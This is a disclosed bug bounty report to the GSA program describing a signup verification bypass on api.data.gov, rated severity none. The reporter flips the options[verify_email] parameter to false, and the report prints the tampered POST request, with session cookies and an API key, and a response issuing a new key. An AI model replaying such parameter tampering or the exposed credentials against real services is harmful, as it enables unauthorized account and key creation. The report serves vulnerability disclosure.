# [api.data.gov] Leak Valid API With out Verification -

## Report Details
- **Report ID**: 266449
- **URL**: https://hackerone.com/reports/266449
- **State**: Closed
- **Severity**: none
- **Submitted**: 2017-09-06T20:09:19.590Z
- **Disclosed**: 2017-09-20T19:35:23.186Z

## Reporter
- **Username**: 0xsp
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_bbp

## Vulnerability Information
Description 
Remote attackers are able to retrieve a valid working api key with random Generation Process without a secure parsing or secure channel , human verification ..etc . 
the current proccess for requesting any api key is with signup form , and message with api delivered privately to user , developer ..etc 
so in this vulnerability any user can send alot of requests for any  email with valid leaked api key . 

Vulnerable module 
=================
[+] api-umbrella/v1/users.json 

Vulnerable parameter 
=====================
[+] options%5Bverify_email%5D


Proof of concept 
=============================
1. goes to signup form https://api.data.gov/signup/
2. intercept the post data 
3. change parameter value s%5Bverify_email%5D from True into false . 
4. successfully reproduce it 


poc logs 


```
POST /api-umbrella/v1/users.json?api_key=8Mndjk7k8ygsU4rM1lwBltMzet1FEAIuZeaqzEqV HTTP/1.1
Host: api.data.gov
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://api.data.gov/signup/
Content-Length: 564
Cookie: _ga=GA1.3.122453759.1504205343; _ga=GA1.2.122453759.1504205343; _api_umbrella_session=NWdRUHhLcGQ4V0xjdFJ3OExpZmNjNjg1K1BIYXBIVjBySUkrczJibHNzckRETVJwUFBpWUlTQldaWm1HeGdIYUtGMWxIVEk1TXdCWkxtVnJ0NDlibmljVWNzQ2I5V3Brd3JMWDNqMEdKMXNjTXdvbmMxc3RjVG9WV1RJRGNtR3AyMUtCWnprYWY3d1YvdkZYTUtRUUNhMlA3SHJmZUlhMjIrQXhPQ3JwMWdmcEJBd0tWbm1sblhVa1R4a1Vqdlg2djh4ZXVieXVNSXYyVVdobXhEOWtFd0lxQm1mWW8vQkdweE9Ea3U1VzRZZnE0Q2NFU0RUNTY0cDRZdWRSaXdiRi0tYTBJbHBHbGZ6UTdlcm9vV2d4NDVRdz09--beda858f41948ac725e4c3aaae87c38e95d34136; _gid=GA1.3.1781902913.1504726572; _gid=GA1.2.1781902913.1504726572; _gat_GSA_ENOR0=1; _gat=1; _gat_legacy=1
Connection: close

user%5Bfirst_name%5D=hacker&user%5Blast_name%5D=hacker&user%5Bemail%5D=hacker%40gmail.com&user%5Buse_description%5D=&user%5Bterms_and_conditions%5D=1&user%5Bregistration_source%5D=web&options%5Bexample_api_url%5D=https%3A%2F%2Fapi.data.gov%2Fnrel%2Falt-fuel-stations%2Fv1%2Fnearest.json%3Fapi_key%3D%7B%7Bapi_key%7D%7D%26location%3DDenver%2BCO&options%5Bcontact_url%5D=https%3A%2F%2Fapi.data.gov%2Fcontact%2F&options%5Bsite_name%5D=&options%5Bsend_welcome_email%5D=true&options%5Bemail_from_name%5D=&options%5Bemail_from_address%5D=&options%5Bverify_email%5D=false

```


response 

```

{"user":{"id":"9f522604-6ccc-4135-a330-3dd678ae9621","first_name":"hacker","last_name":"hacker","email":"hacker@gmail.com","website":null,"use_description":"","registration_source":"web","throttle_by_ip":null,"roles":null,"enabled":true,"created_at":"2017-09-06T19:57:10Z","updated_at":"2017-09-06T19:57:10Z","api_key":"0dA6hjpXUG0V9Lj7kQkx8yiKkm9Go9H15VyPt8fs","settings":null,"creator":null,"updater":null}}

```

Best Regards 
 

## Attachments
- data.mp4
